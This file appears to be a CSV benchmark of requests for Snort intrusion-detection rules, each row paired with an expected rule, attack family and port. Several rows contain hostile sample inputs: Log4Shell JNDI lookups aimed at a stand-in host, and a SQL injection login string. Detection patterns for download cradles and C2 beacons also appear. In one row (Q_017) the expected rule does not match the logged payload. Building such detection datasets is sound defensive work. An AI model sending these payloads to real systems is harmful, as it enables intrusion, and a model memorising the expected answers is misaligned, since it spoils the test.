query_id,query,expected_doc_id,expected_attack_family,expected_attack_type,expected_protocol,expected_destination_port,expected_rule,needs_retrieval
Q_001,Create an IDS signature for need IDS detection logic for Log4Shell JNDI Pattern: Generate a Snort rule for HTTP payloads with ${jndi: patterns. Include protocol and threshold constraints. Observed log: GET /?q=${jndi:ldap://malicious.example/a} HTTP/1.1 user-agent=probe,SNORT_0100,Exploitation,Log4Shell JNDI Pattern,tcp,443,"alert tcp $EXTERNAL_NET any -> $HOME_NET 443 (msg:""Possible Log4Shell JNDI exploit attempt""; flow:to_server,established; content:""${jndi:""; nocase; classtype:web-application-attack; sid:1000100; rev:1;)",True
Q_002,How can we detect rule for tcp syn port scan on the network.,SNORT_0001,Reconnaissance,TCP SYN Port Scan,tcp,80,"alert tcp $EXTERNAL_NET any -> $HOME_NET 80 (msg:""Possible TCP SYN scan against HTTP""; flags:S; detection_filter:track by_src, count 20, seconds 10; classtype:network-scan; sid:1000001; rev:1;)",True
Q_003,Generate a Snort rule to sOC ticket: suspicious DNS_Attack activity observed. Generate a rule for suspected DNS tunneling over port 53. Observed log: DNS query type=TXT name=dk39fj29skd92ks9d.example.net src=10.0.8.24 count=47,SNORT_0149,DNS_Attack,DNS Tunneling,udp,53,"alert udp $HOME_NET any -> $EXTERNAL_NET 53 (msg:""Possible DNS tunneling via TXT queries""; content:""|00 10|""; offset:2; detection_filter:track by_src, count 25, seconds 60; classtype:policy-violation; sid:1000149; rev:1;)",True
Q_004,I need detection for identify HTTP requests containing the Shellshock () { pattern.,SNORT_0135,Exploitation,Shellshock CGI Pattern,tcp,80,"alert tcp $EXTERNAL_NET any -> $HOME_NET 80 (msg:""Possible Shellshock CGI exploit attempt""; flow:to_server,established; content:""() {""; http_header; classtype:web-application-attack; sid:1000135; rev:1;)",True
Q_005,Generate a Snort rule to need IDS detection logic for DNS Tunneling: Detect repeated DNS TXT queries with long encoded-looking subdomains. Include protocol and threshold constraints.,SNORT_0081,DNS_Attack,DNS Tunneling,udp,53,"alert udp $HOME_NET any -> $EXTERNAL_NET 53 (msg:""Possible DNS tunneling via TXT queries""; content:""|00 10|""; offset:2; detection_filter:track by_src, count 25, seconds 60; classtype:policy-violation; sid:1000081; rev:1;)",True
Q_006,"As a security analyst, I want to detect this behavior: Identify possible UDP denial-of-service traffic on port 123.",SNORT_0004,DoS_DDoS,UDP Flood,udp,123,"alert udp $EXTERNAL_NET any -> $HOME_NET 123 (msg:""Possible UDP flood on NTP""; detection_filter:track by_dst, count 300, seconds 10; classtype:attempted-dos; sid:1000004; rev:1;)",True
Q_007,Generate a Snort rule to sOC ticket: suspicious Reconnaissance activity observed. Identify a possible port scan where one source sends many SYN packets to HTTP on port 80.,SNORT_0137,Reconnaissance,TCP SYN Port Scan,tcp,80,"alert tcp $EXTERNAL_NET any -> $HOME_NET 80 (msg:""Possible TCP SYN scan against HTTP""; flags:S; detection_filter:track by_src, count 20, seconds 10; classtype:network-scan; sid:1000137; rev:1;)",True
Q_008,"Generate a Snort rule to as a security analyst, I want to detect this behavior: Create a rule for DNS amplification attempts using query type ANY. Observed log: UDP/53 ANY requests from one source exceed threshold",SNORT_0116,DNS_Attack,DNS Amplification,udp,53,"alert udp $EXTERNAL_NET any -> $HOME_NET 53 (msg:""Possible DNS amplification ANY query abuse""; content:""|00 FF|""; offset:2; detection_filter:track by_src, count 40, seconds 20; classtype:attempted-dos; sid:1000116; rev:1;)",True
Q_009,"As a security analyst, I want to detect this behavior: Identify denial-of-service behavior with many SYN packets to port 8080.",SNORT_0088,DoS_DDoS,TCP SYN Flood,tcp,8080,"alert tcp $EXTERNAL_NET any -> $HOME_NET 8080 (msg:""Possible TCP SYN flood against HTTP-alt""; flags:S; detection_filter:track by_dst, count 200, seconds 5; classtype:attempted-dos; sid:1000088; rev:1;)",True
Q_010,Need IDS detection logic for TCP SYN Port Scan: Generate a Snort rule for reconnaissance traffic targeting HTTPS with SYN flags. Include protocol and threshold constraints.,SNORT_0035,Reconnaissance,TCP SYN Port Scan,tcp,443,"alert tcp $EXTERNAL_NET any -> $HOME_NET 443 (msg:""Possible TCP SYN scan against HTTPS""; flags:S; detection_filter:track by_src, count 20, seconds 10; classtype:network-scan; sid:1000035; rev:1;)",True
Q_011,"As a security analyst, I want to detect this behavior: Create a Snort rule for CGI Bash function injection patterns.",SNORT_0118,Exploitation,Shellshock CGI Pattern,tcp,443,"alert tcp $EXTERNAL_NET any -> $HOME_NET 443 (msg:""Possible Shellshock CGI exploit attempt""; flow:to_server,established; content:""() {""; http_header; classtype:web-application-attack; sid:1000118; rev:1;)",True
Q_012,Create an IDS signature for sOC ticket: suspicious Brute_Force activity observed. Identify FTP authentication guessing from one external source.,SNORT_0146,Brute_Force,FTP Brute Force,tcp,21,"alert tcp $EXTERNAL_NET any -> $HOME_NET 21 (msg:""Possible FTP brute force USER attempts""; flow:to_server,established; content:""USER""; nocase; detection_filter:track by_src, count 20, seconds 60; classtype:attempted-recon; sid:1000146; rev:1;)",True
Q_013,How can we detect need IDS detection logic for HTTP C2 Beacon: Generate a rule for possible malware C2 HTTP beacon traffic. Include protocol and threshold constraints.,SNORT_0011,Malware_C2,HTTP C2 Beacon,tcp,8080,"alert tcp $HOME_NET any -> $EXTERNAL_NET 8080 (msg:""Possible HTTP C2 beacon with suspicious User-Agent""; flow:to_server,established; content:""User-Agent|3a| Mozilla/4.0""; http_header; detection_filter:track by_src, count 10, seconds 300; classtype:trojan-activity; sid:1000011; rev:1;)",True
Q_014,Create a rule for suspicious PowerShell download cradle content.,SNORT_0131,Malware_C2,PowerShell Download Cradle,tcp,443,"alert tcp $HOME_NET any -> $EXTERNAL_NET 443 (msg:""Possible PowerShell download cradle""; flow:to_server,established; content:""powershell""; nocase; content:""DownloadString""; nocase; classtype:trojan-activity; sid:1000131; rev:1;)",True
Q_015,"As a security analyst, I want to detect this behavior: Identify possible UDP denial-of-service traffic on port 500.",SNORT_0072,DoS_DDoS,UDP Flood,udp,500,"alert udp $EXTERNAL_NET any -> $HOME_NET 500 (msg:""Possible UDP flood on IKE""; detection_filter:track by_dst, count 300, seconds 10; classtype:attempted-dos; sid:1000072; rev:1;)",True
Q_016,Generate a Snort rule to rule for icmp ping sweep on the network. Observed log: Firewall log: ICMP echo requests to multiple hosts from 198.51.100.28,SNORT_0138,Reconnaissance,ICMP Ping Sweep,icmp,any,"alert icmp $EXTERNAL_NET any -> $HOME_NET any (msg:""Possible ICMP ping sweep""; itype:8; detection_filter:track by_src, count 30, seconds 20; classtype:network-scan; sid:1000138; rev:1;)",True
Q_017,How can we detect generate a Snort rule for a web request containing SQL injection keywords. Observed log: HTTP URI contains /login.php?user=admin' OR '1'='1 from 203.0.113.10,SNORT_0073,Web_Attack,SQL Injection,tcp,80,"alert tcp $EXTERNAL_NET any -> $HOME_NET 80 (msg:""Possible SQL injection UNION SELECT attempt""; flow:to_server,established; content:""UNION""; nocase; http_uri; content:""SELECT""; nocase; http_uri; classtype:web-application-attack; sid:1000073; rev:1;)",True
Q_018,Write a Snort rule for generate a Snort rule for HTTP payloads with ${jndi: patterns. Observed log: GET /?q=${jndi:ldap://malicious.example/a} HTTP/1.1 user-agent=probe,SNORT_0151,Exploitation,Log4Shell JNDI Pattern,tcp,8443,"alert tcp $EXTERNAL_NET any -> $HOME_NET 8443 (msg:""Possible Log4Shell JNDI exploit attempt""; flow:to_server,established; content:""${jndi:""; nocase; classtype:web-application-attack; sid:1000151; rev:1;)",True
